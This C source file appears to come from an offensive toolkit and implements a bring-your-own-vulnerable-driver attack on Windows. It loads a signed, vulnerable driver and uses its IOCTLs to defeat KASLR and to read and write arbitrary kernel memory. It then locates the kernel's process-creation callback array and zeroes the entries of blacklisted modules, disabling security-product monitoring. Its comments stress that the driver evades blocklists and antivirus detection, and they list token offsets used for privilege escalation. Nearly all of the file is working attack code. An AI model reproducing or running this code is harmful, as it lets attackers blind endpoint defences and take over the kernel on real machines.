/*
 * byovd_winnotify.c — DORM Phase 14: BYOVD via WinNotify.sys
 * byovd/kernel_subverter/byovd_winnotify.c
 *
 * Windows x64 | MinGW/Clang | ring-3
 *
 * Drop-in replacement for byovd_winring0x64.c / byovd.c.
 * Same public API (byovd.h). Swap in the build command:
 *
 *   clang byovd/kernel_subverter/byovd_winnotify.c   \
 *         byovd/kernel_subverter/test_byovd.c        \
 *         -Ibyovd/kernel_subverter                   \
 *         -o test_byovd.exe -lkernel32 -ladvapi32
 *
 * Driver: WinNotify.sys (also seen as signeddrv.sys)
 *   Valid Microsoft Authenticode signature, no identified vendor.
 *   0 VirusTotal detections at publication.
 *   NOT on Windows 11 CI.dll compiled-in blocklist.
 *   No security descriptor on device object — ANY process can open it.
 *   No privilege checks in any IOCTL handler.
 *
 * Device: \\.\WinNotify
 * Service name: WinNotify (arbitrary — we set this)
 *
 * IOCTLs (all METHOD_BUFFERED, FILE_ANY_ACCESS, device type 0x0022):
 *
 *   0x22200C  KASLR defeat
 *             Input  (0x18): { QWORD name_ptr, QWORD unused, QWORD [out]base }
 *             Walks PsLoadedModuleList, returns base of any named kernel module.
 *             Replaces our NtQuerySystemInformation approach entirely.
 *             No privilege required.
 *
 *   0x222040  Arbitrary kernel READ
 *             Input/Output (0x38 shared buffer):
 *               [in]  +0x00 base_addr (kernel VA)
 *               [in]  +0x08 offset    (added to base)
 *               [out] +0x10 *(base+offset+0x00)
 *               [out] +0x18 *(base+offset+0x08)
 *               [out] +0x20 *(base+offset+0x10)  ← GUARD: written only if != 0
 *               [out] +0x28 *(base+offset+0x18)
 *               [out] +0x30 *(base+offset+0x20)
 *             GUARD workaround: pass base=(target-0x10), offset=0.
 *             Target lands at +0x10 → always satisfies guard for non-zero values.
 *             Takes KERNEL VIRTUAL ADDRESSES directly — no VA→PA translation.
 *
 *   0x222044  Arbitrary kernel WRITE
 *             Input (0x18): { QWORD src_ptr, QWORD size, QWORD dst_va }
 *             Calls memmove(dst, src, size) in kernel context.
 *             Only validation: NULL + zero checks on all three fields.
 *             Takes KERNEL VIRTUAL ADDRESSES directly — no VA→PA translation.
 *
 *   0x222000  Physical read  (VA→PA walk + MmCopyMemory,   CR3 user-supplied)
 *   0x222004  Physical write (VA→PA walk + MmMapIoSpaceEx, CR3 user-supplied)
 *             Input (0x28): { DWORD flags, QWORD va, QWORD buf_ptr, QWORD size, QWORD DirBase }
 *             Not used in this backend (VA primitives are sufficient and simpler).
 *
 * ADVANTAGES over WinRing0x64 / RTCore64:
 *   1. No VA→PA translation needed — driver dereferences kernel VAs directly
 *   2. byovd_find_ntoskrnl_phys() step eliminated
 *   3. byovd_get_kernel_base() replaced by faster IOCTL 0x22200C (driver walks
 *      PsLoadedModuleList internally — no NtQuerySystemInformation needed)
 *   4. Not on any public BYOVD blocklist
 *   5. FILE_ANY_ACCESS — standard user can open device (no admin for device open)
 *   6. Built-in KASLR defeat covers any module, not just ntoskrnl
 *
 * EPROCESS offsets (Windows 10/11 x64 — verify with livekd/windbg for your build):
 *   DirectoryTableBase  +0x028
 *   UniqueProcessId     +0x440
 *   ActiveProcessLinks  +0x448
 *   Token (EX_FAST_REF) +0x4B8  → mask &~0xF to strip ref-count bits
 *
 * Link: -lkernel32 -ladvapi32
 */

#include <stdio.h>
#include <string.h>
#include <stddef.h>
#include <time.h>
#include <windows.h>

#include "byovd.h"

/* ============================================================
   CONSTANTS
   ============================================================ */

#define WINNOTIFY_SVC_NAME   "WinNotify"
#define WINNOTIFY_DEVICE     "\\\\.\\WinNotify"

/* All IOCTLs: CTL_CODE(0x0022, Fn, METHOD_BUFFERED, FILE_ANY_ACCESS) */
#define IOCTL_KASLR_DEFEAT   0x22200CUL   /* fn=0x803 — module base resolver     */
#define IOCTL_KERNEL_READ    0x222040UL   /* fn=0x810 — arbitrary kernel VA read  */
#define IOCTL_KERNEL_WRITE   0x222044UL   /* fn=0x811 — arbitrary kernel VA write */
#define IOCTL_PHYS_READ      0x222000UL   /* fn=0x800 — physical read  (unused)   */
#define IOCTL_PHYS_WRITE     0x222004UL   /* fn=0x801 — physical write (unused)   */

#define PSPCRN_MAX_ENTRIES   64UL
#define EX_CB_FUNC_OFFSET    8ULL
#define SYSTINFO_MODULES     11UL

/* ============================================================
   IOCTL INPUT STRUCTURES
   ============================================================ */

/*
 * KASLR_INPUT — for IOCTL_KASLR_DEFEAT (0x22200C)
 * Pass a pointer to a module name string at name_ptr.
 * Driver writes the module base VA to base_out.
 * Total: 0x18 = 24 bytes.
 */
#pragma pack(push, 1)
typedef struct {
    ULONG64 name_ptr;   /* +0x00  pointer to module name string in our VA space */
    ULONG64 unused;     /* +0x08  not used by driver                            */
    ULONG64 base_out;   /* +0x10  [OUTPUT] kernel module base address           */
} KASLR_INPUT;          /* = 0x18 = 24 bytes                                   */
#pragma pack(pop)
_Static_assert(sizeof(KASLR_INPUT) == 0x18, "KASLR_INPUT must be 0x18 bytes");

/*
 * KREAD_BUF — for IOCTL_KERNEL_READ (0x222040)
 * METHOD_BUFFERED — system copies this buffer in for input, copies back for output.
 * The same 0x38-byte region serves as both input and output.
 * Driver reads 5 QWORDs from (base + offset) into slots [2..6].
 * Total: 0x38 = 56 bytes in, 0x38 bytes out.
 */
#pragma pack(push, 1)
typedef struct {
    ULONG64 base;       /* +0x00  kernel VA — base address to read from         */
    ULONG64 offset;     /* +0x08  offset added to base                          */
    ULONG64 out0;       /* +0x10  [OUT] *(base+offset+0x00) ← GUARD (must != 0) */
    ULONG64 out1;       /* +0x18  [OUT] *(base+offset+0x08)                     */
    ULONG64 out2;       /* +0x20  [OUT] *(base+offset+0x10)                     */
    ULONG64 out3;       /* +0x28  [OUT] *(base+offset+0x18)                     */
    ULONG64 out4;       /* +0x30  [OUT] *(base+offset+0x20)                     */
} KREAD_BUF;            /* = 0x38 = 56 bytes                                    */
#pragma pack(pop)
_Static_assert(sizeof(KREAD_BUF) == 0x38, "KREAD_BUF must be 0x38 bytes");

/*
 * KWRITE_INPUT — for IOCTL_KERNEL_WRITE (0x222044)
 * src_ptr:  pointer into OUR userland buffer (system copies it up for driver)
 * size:     bytes to write
 * dst_va:   destination KERNEL VA — written directly by memmove in kernel
 * Total: 0x18 = 24 bytes.
 *
 * NOTE: src_ptr points into the input buffer the I/O manager copies into the
 * system buffer — for METHOD_BUFFERED this means the driver's SystemBuffer
 * contains our src data, and src_ptr must point into our own VA space since
 * the driver passes it as memmove source. We embed the payload inline and
 * point src_ptr at a separate buffer to avoid aliasing.
 */
#pragma pack(push, 1)
typedef struct {
    ULONG64 src_ptr;    /* +0x00  pointer to data to write (our userland VA)    */
    ULONG64 size;       /* +0x08  number of bytes                               */
    ULONG64 dst_va;     /* +0x10  destination kernel virtual address            */
} KWRITE_INPUT;         /* = 0x18 = 24 bytes                                    */
#pragma pack(pop)
_Static_assert(sizeof(KWRITE_INPUT) == 0x18, "KWRITE_INPUT must be 0x18 bytes");

/* ============================================================
   NT INTERNALS
   ============================================================ */

typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct {
    ULONG_PTR Reserved[2];
    PVOID     ImageBase;
    ULONG     ImageSize;
    ULONG     Flags;
    WORD      LoadOrderIndex;
    WORD      InitOrderIndex;
    WORD      LoadCount;
    WORD      OffsetToFileName;
    CHAR      FullPathName[256];
} DORM_SYS_MODULE;

typedef struct {
    ULONG           Count;
    DORM_SYS_MODULE Modules[1];
} DORM_SYS_MODULE_INFO;

/* ============================================================
   MODULE STATE
   ============================================================ */

static HANDLE g_device = INVALID_HANDLE_VALUE;
static char   g_driver_path[MAX_PATH] = {0};

/* ============================================================
   HELPERS
   ============================================================ */

static void json_escape(FILE *fp, const char *s)
{
    if (!s) { fputs("\"\"", fp); return; }
    fputc('"', fp);
    for (const char *p = s; *p; p++) {
        switch (*p) {
            case '"':  fputs("\\\"", fp); break;
            case '\\': fputs("\\\\", fp); break;
            case '\n': fputs("\\n",  fp); break;
            case '\r': fputs("\\r",  fp); break;
            default:
                if ((unsigned char)*p < 0x20)
                    fprintf(fp, "\\u%04X", (unsigned char)*p);
                else fputc(*p, fp);
        }
    }
    fputc('"', fp);
}

static FILE *open_output(const char *path)
{
    if (!path || strcmp(path, "-") == 0) return stdout;
    FILE *fp = NULL; fopen_s(&fp, path, "w"); return fp;
}

static void ts_now(char *buf, int len)
{
    time_t n = time(NULL);
    struct tm *g = gmtime(&n);
    strftime(buf, (size_t)len, "%Y-%m-%dT%H:%M:%SZ", g);
}

/* ============================================================
   DRIVER LOAD / UNLOAD
   ============================================================ */

BOOL byovd_load(const char *driver_path)
{
    strncpy(g_driver_path, driver_path, MAX_PATH - 1);

    char abs_path[MAX_PATH] = {0};
    if (!GetFullPathNameA(driver_path, MAX_PATH, abs_path, NULL)) return FALSE;

    if (GetFileAttributesA(abs_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[byovd] WinNotify.sys not found: %s\n", abs_path);
        return FALSE;
    }

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        printf("[byovd] OpenSCManager failed: %lu\n", GetLastError());
        return FALSE;
    }

    /* clean stale service */
    SC_HANDLE hSvc = OpenServiceA(hScm, WINNOTIFY_SVC_NAME, SERVICE_ALL_ACCESS);
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        Sleep(300);
    }

    hSvc = CreateServiceA(
        hScm,
        WINNOTIFY_SVC_NAME,
        WINNOTIFY_SVC_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        abs_path,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        printf("[byovd] CreateService failed: %lu\n", GetLastError());
        CloseServiceHandle(hScm);
        return FALSE;
    }

    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[byovd] StartService failed: %lu\n", err);
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hScm);
            return FALSE;
        }
    }

    printf("[byovd] WinNotify.sys loaded\n");
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    Sleep(400);
    return TRUE;
}

BOOL byovd_unload(void)
{
    byovd_close();
    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return FALSE;
    SC_HANDLE hSvc = OpenServiceA(hScm, WINNOTIFY_SVC_NAME, SERVICE_ALL_ACCESS);
    BOOL ok = FALSE;
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        ok = DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        printf("[byovd] WinNotify.sys unloaded\n");
    }
    CloseServiceHandle(hScm);
    return ok;
}

/* ============================================================
   DEVICE HANDLE
   ============================================================ */

BOOL byovd_open(void)
{
    g_device = CreateFileA(
        WINNOTIFY_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (g_device == INVALID_HANDLE_VALUE) {
        printf("[byovd] CreateFile(%s) failed: %lu\n",
               WINNOTIFY_DEVICE, GetLastError());
        return FALSE;
    }
    printf("[byovd] device handle: %p\n", (void *)g_device);
    return TRUE;
}

void byovd_close(void)
{
    if (g_device != INVALID_HANDLE_VALUE) {
        CloseHandle(g_device);
        g_device = INVALID_HANDLE_VALUE;
    }
}

/* ============================================================
   byovd_find_ntoskrnl_phys — stub (not needed for this backend)
   Provided for byovd.h API compatibility. Returns 1 immediately.
   ============================================================ */

ULONG64 byovd_find_ntoskrnl_phys(ULONG64 ntoskrnl_va_base)
{
    (void)ntoskrnl_va_base;
    /* WinNotify takes kernel VAs directly — no physical scan needed */
    printf("[byovd] VA→PA translation not required for WinNotify backend\n");
    return 1;   /* non-zero = "success" for the API contract */
}

/* ============================================================
   KERNEL BASE RESOLUTION — via IOCTL 0x22200C
   Replaces NtQuerySystemInformation entirely.
   The driver walks PsLoadedModuleList internally — faster and
   requires zero privileges on the calling process.
   ============================================================ */

ULONG64 byovd_get_kernel_base(void)
{
    /*
     * Pass a pointer to "ntoskrnl.exe" in the name_ptr field.
     * The driver dereferences name_ptr in kernel context (it's a user VA —
     * METHOD_BUFFERED means the I/O manager copies our buffer into a system
     * buffer, and name_ptr still points into our process VA space which the
     * driver accesses via the system buffer in our process context).
     *
     * For METHOD_BUFFERED the input buffer is copied to a system buffer.
     * name_ptr is a POINTER VALUE stored in that buffer — the driver reads
     * the pointer value, then dereferences it. Since our process is the
     * requestor, our VA is accessible in that context.
     */
    static const char mod_name[] = "ntoskrnl.exe";

    KASLR_INPUT in = {0};
    in.name_ptr = (ULONG64)(ULONG_PTR)mod_name;
    in.unused   = 0;
    in.base_out = 0;

    KASLR_INPUT out = {0};
    DWORD returned  = 0;

    if (!DeviceIoControl(g_device, IOCTL_KASLR_DEFEAT,
                         &in,  sizeof(in),
                         &out, sizeof(out),
                         &returned, NULL))
    {
        printf("[byovd] KASLR_DEFEAT ioctl failed: %lu\n", GetLastError());
        return 0;
    }

    return out.base_out;
}

/* ============================================================
   PUBLIC KERNEL R/W — direct VA primitives
   No VA→PA translation. The driver dereferences kernel VAs itself.
   ============================================================ */

/*
 * byovd_read4 — read 4 bytes from a kernel VA.
 * Uses the QWORD read and returns the low 32 bits.
 */
BOOL byovd_read4(ULONG64 va, ULONG *out)
{
    ULONG64 q = 0;
    if (!byovd_read8(va, &q)) return FALSE;
    *out = (ULONG)(q & 0xFFFFFFFF);
    return TRUE;
}

/*
 * byovd_read8 — read 8 bytes from a kernel VA.
 *
 * GUARD WORKAROUND:
 *   The driver only writes output if *(base + offset + 0x10) != 0.
 *   We set base = (va - 0x10) and offset = 0, placing the target QWORD
 *   at exactly base+0x10. The value comes back in out2.
 *
 *   This means each read also dereferences [va-0x10] and [va-0x08] for
 *   out0 and out1 — those reads are side-effect-free since we don't use
 *   those values and the driver only reads, never writes those addresses.
 *
 *   Edge case: if *(va) itself == 0 (a zero QWORD), the guard fires and
 *   DeviceIoControl succeeds but out2 remains 0 from our ZeroMemory init.
 *   We can't distinguish "driver wrote zero" from "driver suppressed output".
 *   For kernel pointers (EPROCESS, Token, callbacks) this is never an issue
 *   because valid kernel pointers are never zero.
 *   For data reads where 0 is a valid value, use the bulk-read path
 *   (byovd_read_bulk) which reads 5 QWORDs at once and you can verify
 *   adjacent non-zero values to confirm output was written.
 */
BOOL byovd_read8(ULONG64 va, ULONG64 *out)
{
    if (g_device == INVALID_HANDLE_VALUE || !out) return FALSE;

    KREAD_BUF buf;
    ZeroMemory(&buf, sizeof(buf));
    buf.base   = va - 0x10;   /* position target at +0x10 to satisfy guard */
    buf.offset = 0;

    DWORD returned = 0;
    if (!DeviceIoControl(g_device, IOCTL_KERNEL_READ,
                         &buf, sizeof(buf),
                         &buf, sizeof(buf),
                         &returned, NULL))
    {
        printf("[byovd] read8(0x%016llX) failed: %lu\n",
               (unsigned long long)va, GetLastError());
        return FALSE;
    }

    /* out2 = *(base + 0x10) = *(va - 0x10 + 0x10) = *(va) ✓ */
    *out = buf.out2;
    return TRUE;
}

/*
 * byovd_write4 — write 4 bytes to a kernel VA.
 * Reads the containing QWORD, patches the 4 bytes, writes back.
 * For aligned 4-byte fields within QWORD-aligned kernel structures
 * this is safe. For our use case (Token field = full QWORD) use write8.
 */
BOOL byovd_write4(ULONG64 va, ULONG value)
{
    /* read the QWORD, patch low or high dword based on alignment */
    ULONG64 aligned = va & ~7ULL;
    ULONG64 existing = 0;
    if (!byovd_read8(aligned, &existing)) return FALSE;

    ULONG offset_in_qword = (ULONG)(va & 7);
    ULONG64 mask = ~((ULONG64)0xFFFFFFFF << (offset_in_qword * 8));
    ULONG64 patched = (existing & mask) | ((ULONG64)value << (offset_in_qword * 8));
    return byovd_write8(aligned, patched);
}

/*
 * byovd_write8 — write 8 bytes to a kernel VA.
 *
 * Input: { src_ptr=&value, size=8, dst_va=va }
 * The driver calls memmove(dst_va, src_ptr, 8) in kernel context.
 * src_ptr points to our userland buffer — accessible because we are
 * the requestor process and the driver runs in our thread context.
 */
BOOL byovd_write8(ULONG64 va, ULONG64 value)
{
    if (g_device == INVALID_HANDLE_VALUE) return FALSE;

    KWRITE_INPUT in;
    ZeroMemory(&in, sizeof(in));
    in.src_ptr = (ULONG64)(ULONG_PTR)&value;   /* point at our local on the stack */
    in.size    = 8;
    in.dst_va  = va;

    DWORD returned = 0;
    if (!DeviceIoControl(g_device, IOCTL_KERNEL_WRITE,
                         &in, sizeof(in),
                         NULL, 0, &returned, NULL))
    {
        printf("[byovd] write8(0x%016llX) failed: %lu\n",
               (unsigned long long)va, GetLastError());
        return FALSE;
    }

    return TRUE;
}

/* ============================================================
   KERNEL EXPORT RESOLUTION — via disk PE walk
   byovd_get_kernel_base() uses IOCTL 0x22200C now, so this
   function is only used for resolving PsSetCreateProcessNotifyRoutine
   (which we need to locate PspCreateProcessNotifyRoutine array).
   ============================================================ */

static BYTE *nqsi_alloc(ULONG class_id)
{
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
                        GetModuleHandleA("ntdll.dll"),
                        "NtQuerySystemInformation");
    if (!NtQSI) return NULL;

    ULONG    sz  = 0x20000;
    BYTE    *buf = NULL;
    NTSTATUS nt;

    do {
        HeapFree(GetProcessHeap(), 0, buf);
        buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
        if (!buf) return NULL;
        nt = NtQSI(class_id, buf, sz, &sz);
        sz += 0x2000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    if (nt != STATUS_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }
    return buf;
}

ULONG64 byovd_resolve_export(ULONG64 kernel_base, const char *export_name)
{
    BYTE *buf = nqsi_alloc(SYSTINFO_MODULES);
    if (!buf) return 0;

    DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)buf;
    char disk_path[MAX_PATH] = {0};

    if (mi->Count > 0) {
        const char *fn = mi->Modules[0].FullPathName;
        if (_strnicmp(fn, "\\SystemRoot\\", 12) == 0) {
            char win_dir[MAX_PATH] = {0};
            GetWindowsDirectoryA(win_dir, MAX_PATH);
            snprintf(disk_path, MAX_PATH - 1, "%s\\%s", win_dir, fn + 12);
        } else {
            strncpy(disk_path, fn, MAX_PATH - 1);
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    if (!disk_path[0]) return 0;

    HANDLE hFile = CreateFileA(disk_path, GENERIC_READ,
                               FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMap  = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 0; }

    BYTE   *disk   = (BYTE *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    ULONG64 result = 0;

    if (disk) {
        IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER *)disk;
        IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64 *)(disk + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

        if (dd->VirtualAddress && dd->Size) {
            IMAGE_EXPORT_DIRECTORY *exp =
                (IMAGE_EXPORT_DIRECTORY *)(disk + dd->VirtualAddress);
            DWORD *names    = (DWORD *)(disk + exp->AddressOfNames);
            WORD  *name_ord = (WORD  *)(disk + exp->AddressOfNameOrdinals);
            DWORD *funcs    = (DWORD *)(disk + exp->AddressOfFunctions);
            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                if (strcmp((const char *)(disk + names[i]), export_name) == 0) {
                    result = kernel_base + funcs[name_ord[i]];
                    break;
                }
            }
        }
        UnmapViewOfFile(disk);
    }
    CloseHandle(hMap);
    CloseHandle(hFile);
    return result;
}

/* ============================================================
   LOCATE PspCreateProcessNotifyRoutine
   ============================================================ */

static ULONG64 find_pspcrn_array(ULONG64 kernel_base)
{
    ULONG64 fn_va = byovd_resolve_export(
                        kernel_base,
                        "PsSetCreateProcessNotifyRoutine");
    if (!fn_va) {
        printf("[byovd] PsSetCreateProcessNotifyRoutine not found\n");
        return 0;
    }
    printf("[byovd] PsSetCreateProcessNotifyRoutine @ 0x%016llX\n",
           (unsigned long long)fn_va);

    /* Read 512 bytes of function body using our kernel read primitive */
    BYTE body[512] = {0};
    for (int i = 0; i < (int)sizeof(body); i += 8) {
        ULONG64 quad = 0;
        if (!byovd_read8(fn_va + (ULONG64)i, &quad)) break;
        memcpy(body + i, &quad, 8);
    }

    /*
     * Scan for LEA RDX,[RIP+disp32] (48 8D 15) or
     *          LEA RCX,[RIP+disp32] (48 8D 0D)
     */
    for (int i = 0; i < (int)sizeof(body) - 7; i++) {
        if (body[i] != 0x48 || body[i+1] != 0x8D) continue;
        if (body[i+2] != 0x15 && body[i+2] != 0x0D) continue;

        INT32   disp      = *(INT32 *)(body + i + 3);
        ULONG64 candidate = fn_va + (ULONG64)i + 7 + (ULONG64)(INT64)disp;

        if ((candidate >> 48) != 0xFFFF) continue;

        printf("[byovd] PspCreateProcessNotifyRoutine @ 0x%016llX "
               "(offset +%d, %s)\n",
               (unsigned long long)candidate, i,
               body[i+2] == 0x15 ? "LEA RDX" : "LEA RCX");
        return candidate;
    }

    printf("[byovd] PspCreateProcessNotifyRoutine scan failed\n");
    return 0;
}

/* ============================================================
   VA → MODULE NAME  (NtQSI module list)
   ============================================================ */

static BOOL va_to_module(ULONG64 va, char *name_out, int name_len,
                          DORM_SYS_MODULE_INFO *mi)
{
    for (ULONG i = 0; i < mi->Count; i++) {
        ULONG64 base = (ULONG64)(ULONG_PTR)mi->Modules[i].ImageBase;
        ULONG64 end  = base + (ULONG64)mi->Modules[i].ImageSize;
        if (va >= base && va < end) {
            const char *fn = mi->Modules[i].FullPathName
                           + mi->Modules[i].OffsetToFileName;
            strncpy(name_out, fn, (size_t)(name_len - 1));
            name_out[name_len - 1] = '\0';
            return TRUE;
        }
    }
    name_out[0] = '\0';
    return FALSE;
}

/* ============================================================
   CALLBACK ENUMERATION + REMOVAL
   ============================================================ */

int dorm_enum_process_callbacks(const char *output_path)
{
    return dorm_remove_process_callbacks(NULL, 0, output_path);
}

int dorm_remove_process_callbacks(const char **blacklist,
                                   int          bl_count,
                                   const char  *output_path)
{
    /*
     * Step 1: kernel base via IOCTL 0x22200C — no NtQSI, no privileges needed.
     * *the driver hands us the kernel base before we even break a sweat*
     */
    ULONG64 kernel_base = byovd_get_kernel_base();
    if (!kernel_base) {
        printf("[byovd] kernel base resolution failed\n");
        return -1;
    }
    printf("[byovd] ntoskrnl @ 0x%016llX  (via IOCTL 0x22200C)\n",
           (unsigned long long)kernel_base);

    /* Step 2: also get other useful module bases while we're here */
    {
        static const char win32k[] = "win32k.sys";
        KASLR_INPUT in = {0}, out = {0};
        DWORD ret = 0;
        in.name_ptr = (ULONG64)(ULONG_PTR)win32k;
        if (DeviceIoControl(g_device, IOCTL_KASLR_DEFEAT,
                            &in, sizeof(in), &out, sizeof(out), &ret, NULL))
            printf("[byovd] win32k.sys  @ 0x%016llX\n",
                   (unsigned long long)out.base_out);
    }

    /* Step 3: locate PspCreateProcessNotifyRoutine array */
    ULONG64 arr = find_pspcrn_array(kernel_base);
    if (!arr) return -1;

    /* Step 4: get module list for callback attribution */
    BYTE *mi_buf = nqsi_alloc(SYSTINFO_MODULES);
    if (!mi_buf) return -1;
    DORM_SYS_MODULE_INFO *mi = (DORM_SYS_MODULE_INFO *)mi_buf;

    FILE *fp = open_output(output_path);
    if (!fp) { HeapFree(GetProcessHeap(), 0, mi_buf); return -1; }

    char ts[32] = {0};
    ts_now(ts, sizeof(ts));

    fprintf(fp,
        "{\n"
        "  \"collector\": \"byovd_process_callbacks\",\n"
        "  \"driver\": \"WinNotify.sys\",\n"
        "  \"timestamp_utc\": \"%s\",\n"
        "  \"kernel_base\": \"0x%016llX\",\n"
        "  \"PspCreateProcessNotifyRoutine\": \"0x%016llX\",\n"
        "  \"dry_run\": %s,\n"
        "  \"callbacks\": [\n",
        ts,
        (unsigned long long)kernel_base,
        (unsigned long long)arr,
        (blacklist == NULL) ? "true" : "false");

    int  found   = 0;
    int  removed = 0;
    BOOL first   = TRUE;

    for (ULONG i = 0; i < PSPCRN_MAX_ENTRIES; i++) {
        ULONG64 entry = 0;
        if (!byovd_read8(arr + (ULONG64)i * 8, &entry) || !entry) continue;

        ULONG64 block_ptr = entry & ~0xFULL;
        if (!block_ptr) continue;

        ULONG64 callback_fn = 0;
        if (!byovd_read8(block_ptr + EX_CB_FUNC_OFFSET, &callback_fn)
            || !callback_fn)
            continue;

        char module_name[256] = {0};
        va_to_module(callback_fn, module_name, sizeof(module_name), mi);

        BOOL blacklisted = FALSE;
        for (int b = 0; b < bl_count; b++) {
            if (blacklist[b] && _stricmp(module_name, blacklist[b]) == 0) {
                blacklisted = TRUE;
                break;
            }
        }

        if (!first) fputs(",\n", fp);
        first = FALSE;

        fprintf(fp,
            "    {\"index\":%lu"
            ",\"entry\":\"0x%016llX\""
            ",\"block\":\"0x%016llX\""
            ",\"callback\":\"0x%016llX\""
            ",\"module\":",
            i,
            (unsigned long long)entry,
            (unsigned long long)block_ptr,
            (unsigned long long)callback_fn);
        json_escape(fp, module_name[0] ? module_name : "<unknown>");

        if (blacklisted && blacklist != NULL) {
            if (byovd_write8(arr + (ULONG64)i * 8, 0)) {
                fputs(",\"action\":\"REMOVED\"}", fp);
                printf("[byovd] removed callback[%lu] — %s @ 0x%016llX\n",
                       i, module_name, (unsigned long long)callback_fn);
                removed++;
            } else {
                fputs(",\"action\":\"REMOVE_FAILED\"}", fp);
            }
        } else {
            fputs(",\"action\":\"kept\"}", fp);
            printf("[byovd] callback[%lu] — %-40s @ 0x%016llX\n",
                   i,
                   module_name[0] ? module_name : "<unknown>",
                   (unsigned long long)callback_fn);
        }

        found++;
    }

    fprintf(fp,
        "\n  ],\n"
        "  \"callbacks_found\": %d,\n"
        "  \"callbacks_removed\": %d\n"
        "}\n",
        found, removed);

    if (fp != stdout) fclose(fp);
    HeapFree(GetProcessHeap(), 0, mi_buf);

    printf("[byovd] %d callbacks found, %d removed\n", found, removed);
    return found;
}
